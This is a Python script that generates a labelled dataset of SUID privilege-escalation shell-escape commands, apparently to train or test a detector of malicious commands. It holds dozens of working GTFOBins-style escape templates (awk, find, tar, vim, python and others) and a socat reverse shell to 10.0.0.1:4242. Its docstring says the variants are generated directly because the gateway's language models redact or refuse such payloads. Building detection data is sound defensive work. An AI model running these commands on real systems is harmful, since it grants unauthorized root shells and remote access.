"""Deterministic SUID-privilege-escalation interpreter-escape variant generator.

The LLM gateway cannot reliably produce shell-escape payloads (gpt-5.6-sol
redacts `/bin/sh` -> placeholders; deepseek-v4-flash has flaky safety refusals).
So we generate variants directly from the canonical GTFOBins technique patterns
and attach hard labels at generation time (no LLM, no Jev labeling pass).

Each row: {text, verdict, actions, source}. Jev is used only for spot-check QA.

Commands are string-distinct from the frozen external test set (exact duplicates
are removed by the consumer via --exclude).
"""
from __future__ import annotations

import argparse
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "dataset" / "suid_variants.jsonl"

# shell tokens substituted into {sh}; -p preserves euid (the classic SUID escape)
SH = ["/bin/sh", "sh", "/bin/bash", "bash", "dash", "/bin/sh -p", "sh -p", "/bin/bash -p"]

# tool -> list of templates. {sh} is replaced by each shell token.
TEMPLATES: dict[str, list[str]] = {
    "awk": [
        "awk 'BEGIN {system(\"{sh}\")}'",
        "gawk 'BEGIN {system(\"{sh}\")}'",
        "mawk 'BEGIN {system(\"{sh}\")}'",
        "nawk 'BEGIN {system(\"{sh}\")}'",
    ],
    "find": [
        "find . -exec {sh} \\; -quit",
        "find / -perm -4000 -type f -exec {sh} \\;",
        "find . -type d -exec {sh} \\;",
    ],
    "make": [
        "make --eval='$(shell {sh})' .",
        "make -s --eval='x:; {sh}' .",
        "make -C /tmp --eval='$(shell {sh})'",
    ],
    "rpm": [
        "rpm --eval '%({sh})'",
        "rpmdb --eval '%({sh})'",
        "rpmquery --eval '%({sh})'",
        "rpmverify --eval '%({sh})'",
    ],
    "git": [
        "git -c core.pager='{sh} -c {sh}' log",
        "git -c alias.x='!{sh}' x",
        "git branch --help config\n!/bin/sh",
    ],
    "gdb": [
        "gdb -nx -ex '!{sh}' -ex quit",
        "gdb -p $$ -batch -ex 'call system(\"{sh}\")'",
    ],
    "ghc": [
        "ghc -e 'System.Process.callCommand \"{sh}\"'",
        "runghc -e 'System.Process.callCommand \"{sh}\"'",
    ],
    "gnuplot": [
        "gnuplot -e 'system(\"{sh}\")'",
        "gnuplot -persist -e 'system(\"{sh}\")'",
    ],
    "octave": [
        "octave --eval 'system(\"{sh}\")'",
        "octave-cli --eval 'system(\"{sh}\")'",
    ],
    "perl": [
        "perl -e 'exec \"{sh}\";'",
        "perl -e 'system(\"{sh}\");'",
        "perlbug -e 'exec \"{sh}\" #'",
    ],
    "php": [
        "php -r 'system(\"{sh}\");'",
        "php -r 'exec(\"{sh}\");'",
        "php -r 'passthru(\"{sh}\");'",
    ],
    "python": [
        "python -c 'import os; os.system(\"{sh}\")'",
        "python3 -c 'import os; os.execl(\"{sh}\", \"sh\", \"-p\")'",
        "python -c 'import pty; pty.spawn(\"{sh}\")'",
    ],
    "ruby": [
        "ruby -e 'exec \"{sh}\"'",
        "ruby -e 'system(\"{sh}\")'",
    ],
    "slsh": [
        "slsh -e 'system(\"{sh}\")'",
    ],
    "scp": [
        "scp -S {sh} /etc/hosts /tmp/x",
    ],
    "ssh": [
        "ssh -o ProxyCommand='{sh} -c {sh}' localhost",
    ],
    "watch": [
        "watch -x {sh} -c 'reset; exec {sh} 1>&0 2>&0'",
        "watch 'reset; exec {sh} 1>&0 2>&0'",
    ],
    "npm": [
        "npm exec {sh}",
        "npm --prefix /tmp exec {sh}",
    ],
    "yarn": [
        "yarn exec {sh}",
    ],
    "bundle": [
        "bundle exec {sh}",
        "BUNDLE_GEMFILE=x bundle exec {sh}",
    ],
    "pip": [
        "pip install --config-settings=--build-option={sh} pkg",
    ],
    "pexec": [
        "pexec {sh}",
        "pexec -n 1 {sh}",
    ],
    "R": [
        "R --no-save -e 'system(\"{sh}\")'",
        "Rscript -e 'system(\"{sh}\")'",
    ],
    "socat": [
        "socat exec:'{sh} -p',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242",
    ],
    "openssl": [
        "echo $({sh} -c 'id' | base64) | base64 -d | {sh}",
    ],
    "base64": [
        "echo <b64> | base64 -d | {sh}",
    ],
    "certbot": [
        "certbot certonly -n -d x --standalone --agree-tos --email x --pre-hook='{sh} -p'",
    ],
    "check_ssl_cert": [
        "check_ssl_cert --hook='{sh} -p' host",
    ],
    "ed": [
        "ed\n!{sh}\nq",
    ],
    "ex": [
        "ex -c ':!{sh}'",
    ],
    "vi": [
        "vi -c ':!{sh}' /dev/null",
        "vim -c ':!{sh}' /dev/null",
    ],
    "less": [
        "less /etc/hosts\n!{sh}",
    ],
    "more": [
        "more /etc/hosts\n!{sh}",
    ],
    "mail": [
        "mail --exec='!{sh}'",
        "mail -f /etc/hosts\n!{sh}",
    ],
    "ftp": [
        "ftp\n!{sh}",
    ],
    "lftp": [
        "lftp -c '!{sh}'",
    ],
    "dc": [
        "dc -e '!{sh}'",
    ],
    "nmap": [
        "nmap --interactive\n!{sh}",
        "nmap --script '{sh} -p' localhost",
    ],
    "script": [
        "script -c {sh} /dev/null",
    ],
    "tar": [
        "tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec={sh} /etc/hosts",
        "tar --checkpoint-action=exec={sh} -cf /tmp/x.tar /etc/hosts",
    ],
    "zip": [
        "zip -q /tmp/x.zip /etc/hosts -T -TT '{sh} -p'",
        "unzip -q /tmp/x.zip -T -TT '{sh} -p'",
    ],
    "gzip": [
        "gzip -d --to-command={sh} /tmp/x.gz",
    ],
    "bzip2": [
        "bzip2 -d --to-command={sh} /tmp/x.bz2",
    ],
    "xz": [
        "xz -d --to-command={sh} /tmp/x.xz",
    ],
    "vim": [
        "vim -c ':py3 import os; os.execl(\"{sh}\", \"sh\", \"-p\")' /dev/null",
        "vim -c ':lua os.execute(\"{sh}\")' /dev/null",
    ],
    "screen": [
        "screen -D -m {sh} -c 'exec {sh} 1>&0 2>&0'",
    ],
    "tmux": [
        "tmux new-session -d -s x '{sh} -p'",
    ],
    "expect": [
        "expect -c 'spawn {sh}'",
    ],
    "tclsh": [
        "tclsh -c 'exec {sh}'",
    ],
    "busybox": [
        "busybox {sh}",
    ],
    "env": [
        "env {sh} -p",
    ],
    "xargs": [
        "xargs -I{} {sh} -c {} <<< 'id'",
    ],
    "emacs": [
        "emacs -Q -nw --eval '(progn (setq shell-file-name \"{sh}\") (shell))'",
    ],
}

# templates whose payload is a network reverse/bind shell (extra action)
REVERSE_TOOLS = {"socat"}


def render(template: str, sh: str) -> str:
    return template.replace("{sh}", sh)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", type=str, default=str(OUT))
    ap.add_argument("--limit_sh", type=int, default=4, help="cap shell-token variants per template")
    args = ap.parse_args()

    rows = []
    seen = set()
    for tool, tpls in TEMPLATES.items():
        for tpl in tpls:
            for sh in SH[: args.limit_sh]:
                cmd = render(tpl, sh).replace("\n", "; ").strip()
                if not cmd or cmd in seen:
                    continue
                seen.add(cmd)
                actions = ["execute_local"]
                if tool in REVERSE_TOOLS:
                    actions = ["execute_local", "reverse_shell"]
                rows.append({
                    "text": cmd,
                    "verdict": "verdict.malicious",
                    "actions": [f"action.{a}" for a in actions],
                    "source": "suid_variant",
                    "tool": tool,
                })

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps(r, ensure_ascii=False) + "\n")
    print(f"wrote {len(rows)} variants -> {out}")


if __name__ == "__main__":
    main()
